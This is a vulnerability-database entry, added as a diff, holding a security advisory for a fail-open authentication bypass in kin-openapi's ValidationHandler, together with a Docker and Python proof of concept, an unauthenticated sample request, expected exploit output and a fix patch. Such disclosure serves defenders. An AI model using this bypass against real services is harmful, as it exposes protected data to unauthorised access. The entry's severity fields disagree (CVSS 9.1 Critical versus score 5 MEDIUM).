@@ -1,0 +1,386 @@
+[basic]
+description = '''
+### Summary
+`ValidationHandler.Load()` in `getkin/kin-openapi` silently replaces a nil `AuthenticationFunc` with `NoopAuthenticationFunc`, which always returns `nil` without performing any credential check. Because this substitution happens unconditionally when the caller omits the field, every OpenAPI `security` requirement declared in the spec is silently satisfied for unauthenticated requests. An unauthenticated remote attacker can reach handlers for routes whose OpenAPI operation requires an API key, OAuth token, or any other security scheme if the application relies on `ValidationHandler` as its enforcement middleware. 
+
+### Details
+`ValidationHandler` is an HTTP middleware exported by `openapi3filter` that validates incoming requests and responses against a loaded OpenAPI specification. Its `Load()` method initialises default fields before the handler begins serving:
+
+```go
+// openapi3filter/validation_handler.go:47-49
+if h.AuthenticationFunc == nil {
+    h.AuthenticationFunc = NoopAuthenticationFunc
+}
+```
+
+`NoopAuthenticationFunc` is defined as:
+
+```go
+// openapi3filter/validation_handler.go:17-18
+func NoopAuthenticationFunc(context.Context, *AuthenticationInput) error { return nil }
+```
+
+It always returns `nil`, meaning every security scheme check it handles is automatically approved.
+
+When a request arrives, `ServeHTTP` → `before` → `validateRequest` assembles a `RequestValidationInput` with the current `AuthenticationFunc` (now the no-op) injected into `Options`:
+
+```go
+// openapi3filter/validation_handler.go:91-103
+options := &Options{
+    AuthenticationFunc: h.AuthenticationFunc,
+}
+requestValidationInput := &RequestValidationInput{
+    Request:    r,
+    PathParams: pathParams,
+    Route:      route,
+    Options:    options,
+}
+if err = ValidateRequest(r.Context(), requestValidationInput); err != nil {
+    return err
+}
+```
+
+Inside `ValidateRequest`, each security requirement calls `options.AuthenticationFunc`:
+
+```go
+// openapi3filter/validate_request.go:436-438
+f := options.AuthenticationFunc
+if f == nil {
+    return ErrAuthenticationServiceMissing   // fail-closed path — never reached via ValidationHandler
+}
+// ...
+// openapi3filter/validate_request.go:497-503
+if err := f(ctx, &AuthenticationInput{...}); err != nil {
+    return err
+}
+```
+
+Because `f` is the no-op (not `nil`), the `ErrAuthenticationServiceMissing` guard is never triggered and `f(...)` returns `nil`, clearing the security requirement. Control then proceeds to the protected handler (`validation_handler.go:61-62`).
+
+The critical contradiction is that callers who use `ValidateRequest` directly with a nil `AuthenticationFunc` get fail-closed behavior (`ErrAuthenticationServiceMissing`), while callers who use the higher-level `ValidationHandler` with a nil `AuthenticationFunc` get fail-open behavior. Since omitting `AuthenticationFunc` is the natural default, the majority of real-world integrations are vulnerable.
+
+Affected source file and line: `openapi3filter/validation_handler.go:47–49` (commit `30e2923`, tag `v0.143.0`).
+
+### PoC
+**Environment**
+
+```
+Docker (any version supporting multi-stage builds)
+Go 1.25 (inside the container via golang:1.25-alpine)
+getkin/kin-openapi v0.143.0 (local source copy)
+```
+
+**Step 1 — Build the Docker image**
+
+From the repository root (parent of `vuln-001/`):
+
+```bash
+docker build \
+  -t vuln001-auth-bypass-poc \
+  -f vuln-001/Dockerfile \
+  reports/github_web_233_getkin__kin-openapi
+```
+
+The `Dockerfile` copies the local `kin-openapi` source into `/kin-openapi/` inside the image and builds a Go binary (`/poc-binary`) from `main.go`. The `go.mod` inside the image uses a `replace` directive pointing to `/kin-openapi`, so no network access to the Go module proxy is required.
+
+**Step 2 — Run the container**
+
+```bash
+docker run --rm --network none vuln001-auth-bypass-poc
+```
+
+**Step 3 (alternative) — Use the Python helper**
+
+```bash
+python3 vuln-001/poc.py --no-cleanup
+```
+
+**What the PoC does**
+
+`main.go` creates a temporary OpenAPI 3.0 spec that declares `GET /secret` as protected by an `apiKey` security scheme:
+
+```yaml
+paths:
+  /secret:
+    get:
+      security:
+        - apiKey: []
+components:
+  securitySchemes:
+    apiKey:
+      type: apiKey
+      name: X-Api-Key
+      in: header
+```
+
+It then constructs a `ValidationHandler` **without** setting `AuthenticationFunc`, calls `Load()`, and sends a request with no `X-Api-Key` header:
+
+```http
+GET /secret HTTP/1.1
+Host: example.test
+# X-Api-Key header is intentionally absent
+```
+
+**Expected (vulnerable) output**
+
+```
+=== CONTRAST: Direct ValidateRequest with nil AuthenticationFunc ===
+  Direct ValidateRequest (nil auth) => ERROR: security requirements failed: missing AuthenticationFunc
+  -> Fail-CLOSED behavior confirmed: missing auth function is rejected
+
+=== EXPLOIT: ValidationHandler.Load() with nil AuthenticationFunc ===
+  OpenAPI spec defines: security: [{apiKey: []}] on GET /secret
+  ValidationHandler.AuthenticationFunc: NOT SET (nil)
+  Load() will inject NoopAuthenticationFunc, which always returns nil
+
+  Request:  GET /secret  (X-Api-Key header: absent)
+  Response: status=200  body=\"SECRET_DATA\n\"
+
+[EXPLOIT SUCCESS] Auth bypass confirmed!
+  Protected resource /secret returned SECRET_DATA without credentials.
+  ValidationHandler.Load() silently injected NoopAuthenticationFunc.
+  Security requirement was bypassed. VULN-001 REPRODUCED.
+```
+
+The contrast block confirms fail-closed behavior when `ValidateRequest` is called directly. The exploit block confirms fail-open behavior through `ValidationHandler`. Status 200 and `SECRET_DATA` are returned without any credential.
+
+**Remediation patch**
+
+```diff
+--- a/openapi3filter/validation_handler.go
++++ b/openapi3filter/validation_handler.go
+@@
+  if h.Handler == nil {
+      h.Handler = http.DefaultServeMux
+  }
+- if h.AuthenticationFunc == nil {
+-     h.AuthenticationFunc = NoopAuthenticationFunc
+- }
+  if h.ErrorEncoder == nil {
+      h.ErrorEncoder = DefaultErrorEncoder
+  }
+```
+
+After this change, a nil `AuthenticationFunc` propagates into `ValidateRequest`, which returns `ErrAuthenticationServiceMissing` and rejects the request. Callers who genuinely want to skip authentication can still opt in explicitly: `h.AuthenticationFunc = openapi3filter.NoopAuthenticationFunc`.
+
+### Impact
+This is an **authentication bypass** vulnerability (CWE-287). Any application that:
+
+1. uses `openapi3filter.ValidationHandler` as its HTTP middleware, and
+2. declares one or more `security` requirements in its OpenAPI specification, and
+3. does **not** explicitly set `AuthenticationFunc`,
+
+is fully exposed. An unauthenticated remote attacker can send requests to any protected endpoint without supplying credentials; the middleware accepts the request and forwards it to the underlying handler as if authentication had succeeded.
+
+Affected parties include all Go services that adopt `ValidationHandler` as a drop-in validation layer and rely on OpenAPI `security` declarations for access control without adding a separate authentication layer upstream (e.g., an API gateway or reverse proxy). Because the insecure behavior is the default, developers following the \"getting started\" path are affected without any additional mistake.
+
+The confidentiality and integrity of data behind secured endpoints are both at high risk. Availability is not directly affected by this vulnerability.
+
+### Reproduction artifacts
+
+#### `Dockerfile`
+
+```dockerfile
+FROM golang:1.25-alpine
+
+# Install git (needed by go mod for some packages)
+RUN apk add --no-cache git
+
+WORKDIR /workspace
+
+# Copy the vulnerable kin-openapi repository as a local module replacement
+COPY repo/ /kin-openapi/
+
+# Set up the PoC Go module
+RUN mkdir -p /workspace/poc
+WORKDIR /workspace/poc
+
+# Create go.mod that uses the local copy of the vulnerable kin-openapi
+RUN cat > go.mod <<'EOF'
+module kin-openapi-auth-bypass-poc
+
+go 1.25
+
+require github.com/getkin/kin-openapi v0.143.0
+
+replace github.com/getkin/kin-openapi => /kin-openapi
+EOF
+
+# Copy the PoC source (build context is the parent directory of vuln-001/)
+COPY vuln-001/main.go /workspace/poc/main.go
+
+# Resolve dependencies and build
+RUN go mod tidy && \
+    go build -o /poc-binary .
+
+# Run the PoC
+CMD [\"/poc-binary\"]
+```
+
+#### `poc.py`
+
+```python
+#!/usr/bin/env python3
+\"\"\"
+PoC for VULN-001: ValidationHandler.Load() Fail-Open Auth Bypass via NoopAuthenticationFunc Default
+Repository: getkin/kin-openapi v0.143.0
+CWE: CWE-287 (Improper Authentication)
+CVSS: 9.1 (Critical)
+
+Vulnerability Summary:
+    ValidationHandler.Load() silently replaces a nil AuthenticationFunc with NoopAuthenticationFunc.
+    NoopAuthenticationFunc always returns nil (no error), so any OpenAPI security requirement
+    passes without validation when the user forgets to set AuthenticationFunc.
+
+    Contrast: ValidateRequest() with nil AuthenticationFunc returns ErrAuthenticationServiceMissing
+    (fail-closed). ValidationHandler.Load() breaks this guarantee (fail-open).
+
+Usage:
+    python3 poc.py [--build-dir <dir>] [--image <name>] [--no-cleanup]
+\"\"\"
+
+import argparse
+import os
+import subprocess
+import sys
+import json
+
+IMAGE_NAME = \"vuln001-auth-bypass-poc\"
+SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
+REPO_DIR = os.path.join(os.path.dirname(SCRIPT_DIR), \"repo\")
+
+SUCCESS_MARKER = \"[EXPLOIT SUCCESS]\"
+EXPECTED_STATUS = \"status=200\"
+EXPECTED_BODY = 'body=\"SECRET_DATA\\n\"'
+
+
+def run(cmd, **kwargs):
+    \"\"\"Run a shell command and return (returncode, stdout, stderr).\"\"\"
+    print(f\"[CMD] {' '.join(cmd)}\")
+    result = subprocess.run(cmd, capture_output=True, text=True, **kwargs)
+    if result.stdout:
+        print(result.stdout, end=\"\")
+    if result.stderr:
+        print(result.stderr, end=\"\", file=sys.stderr)
+    return result.returncode, result.stdout, result.stderr
+
+
+def build_image(build_dir):
+    \"\"\"Build the Docker image containing the PoC binary.\"\"\"
+    print(\"\n[*] Building Docker image ...\")
+    rc, stdout, stderr = run([
+        \"docker\", \"build\",
+        \"--build-arg\", f\"REPO_DIR={REPO_DIR}\",
+        \"-t\", IMAGE_NAME,
+        \"-f\", os.path.join(build_dir, \"Dockerfile\"),
+        # Build context is the reports root so both Dockerfile and repo/ are reachable
+        os.path.dirname(build_dir),
+    ])
+    if rc != 0:
+        print(f\"[ERROR] Docker build failed (exit {rc})\", file=sys.stderr)
+        sys.exit(rc)
+    print(\"[*] Docker build succeeded.\")
+    return f\"docker build -t {IMAGE_NAME} -f {os.path.join(build_dir, 'Dockerfile')} {os.path.dirname(build_dir)}\"
+
+
+def run_container():
+    \"\"\"Run the container and capture output.\"\"\"
+    print(\"\n[*] Running PoC container ...\")
+    rc, stdout, stderr = run([
+        \"docker\", \"run\", \"--rm\",
+        \"--network\", \"none\",   # no network access needed
+        IMAGE_NAME,
+    ])
+    combined = stdout + stderr
+    return rc, combined
+
+
+def evaluate(exit_code, output):
+    \"\"\"Determine whether the exploit was confirmed.\"\"\"
+    passed = (
+        exit_code == 0
+        and SUCCESS_MARKER in output
+        and EXPECTED_STATUS in output
+        and EXPECTED_BODY in output
+    )
+    return passed
+
+
+def cleanup_image():
+    \"\"\"Remove the Docker image.\"\"\"
+    print(f\"\n[*] Removing Docker image {IMAGE_NAME} ...\")
+    run([\"docker\", \"rmi\", \"-f\", IMAGE_NAME])
+
+
+def main():
+    global IMAGE_NAME
+    parser = argparse.ArgumentParser(description=\"VULN-001 Auth Bypass PoC runner\")
+    parser.add_argument(\"--build-dir\", default=SCRIPT_DIR,
+                        help=\"Directory containing Dockerfile and main.go\")
+    parser.add_argument(\"--image\", default=IMAGE_NAME,
+                        help=\"Docker image name to build/run\")
+    parser.add_argument(\"--no-cleanup\", action=\"store_true\",
+                        help=\"Keep the Docker image after the run\")
+    args = parser.parse_args()
+    IMAGE_NAME = args.image
+
+    print(\"=\" * 60)
+    print(\"VULN-001 PoC: Auth Bypass via NoopAuthenticationFunc Default\")
+    print(\"=\" * 60)
+    print(f\"  Build dir : {args.build_dir}\")
+    print(f\"  Repo dir  : {REPO_DIR}\")
+    print(f\"  Image     : {IMAGE_NAME}\")
+
+    build_cmd = build_image(args.build_dir)
+    run_cmd = f\"docker run --rm --network none {IMAGE_NAME}\"
+
+    exit_code, output = run_container()
+
+    if not args.no_cleanup:
+        cleanup_image()
+
+    passed = evaluate(exit_code, output)
+
+    print(\"\n\" + \"=\" * 60)
+    if passed:
+        print(\"[RESULT] PASS — Auth bypass CONFIRMED\")
+        print(\"  The protected handler returned SECRET_DATA without credentials.\")
+        print(\"  ValidationHandler.Load() injected NoopAuthenticationFunc silently.\")
+    else:
+        print(f\"[RESULT] FAIL — Exploit not confirmed (exit={exit_code})\")
+
+    print(f\"\nContainer exit code : {exit_code}\")
+    print(f\"Success marker found: {SUCCESS_MARKER in output}\")
+    print(f\"Status 200 found    : {EXPECTED_STATUS in output}\")
+    print(f\"Secret body found   : {EXPECTED_BODY in output}\")
+
+    # Exit with code that signals pass/fail
+    sys.exit(0 if passed else 1)
+
+
+if __name__ == \"__main__\":
+    main()
+```
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "kin-openapi: ValidationHandler.Load() Fail-Open Authentication Bypass via NoopAuthenticationFunc Default"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-r277-6w6q-xmqw"]
+ave_id = "AVE-2026-1197"
+
+[meta]
+collected_at = "2026-08-06T12:12:02.033718425+00:00"
+status = "completed"
+
+[references]
+urls = []
